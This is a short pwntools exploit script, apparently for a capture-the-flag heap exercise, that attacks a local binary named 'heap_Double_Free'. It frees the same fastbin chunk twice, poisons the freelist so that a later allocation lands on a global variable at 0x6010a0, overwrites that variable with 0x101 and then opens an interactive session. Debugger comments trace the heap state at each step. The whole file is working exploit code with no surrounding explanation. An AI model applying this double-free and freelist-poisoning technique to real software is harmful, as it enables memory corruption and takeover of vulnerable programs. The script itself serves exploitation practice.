from pwn import *

s = process('./heap_Double_Free')
context(log_level='debug', arch='amd64', os='linux')


def choice(i):
    # scanf用sendline, read用send
    s.sendlineafter('$ ', str(i))


def add(id, size, content=''):
    choice(1)
    s.sendlineafter('nd size :\n', str(id))
    s.sendline(str(size))
    if content:
        s.sendline(content)


def free(i):
    choice(2)
    s.sendlineafter('id :', str(i))


add(0, 0x68, 'a' * 0x68)
add(1, 0x68, 'a' * 0x68)
add(2, 0x68, 'a' * 0x68)
# s.recv()
free(0)
free(1)
free(0)
gdb.attach(s, 'b*0x0000040098F\n')
# 0x70: 0x1521010 —▸ 0x1521080 ◂— 0x1521010
add(0, 0x68, p64(0x6010a0))
# 0x70: 0x1521080 —▸ 0x1521010 —▸ 0x6010a0 (globals1) ◂— 0x0
add(4, 0x68, 'bbbb')  # 0x21af080 'bbbb' 申请到0x1521080 # 0x1521010 —▸ 0x6010a0 (globals1) ◂— 0x0
add(5, 0x68, 'cccc')  # 0x21af010 'cccc' 申请到0x1521010 # 0x6010a0 (globals1) ◂— 0x0
add(6, 0x68, p64(0x101))  # 申请到 0x6010a0 , data 被改为 '0x101'

choice(4)
s.interactive()
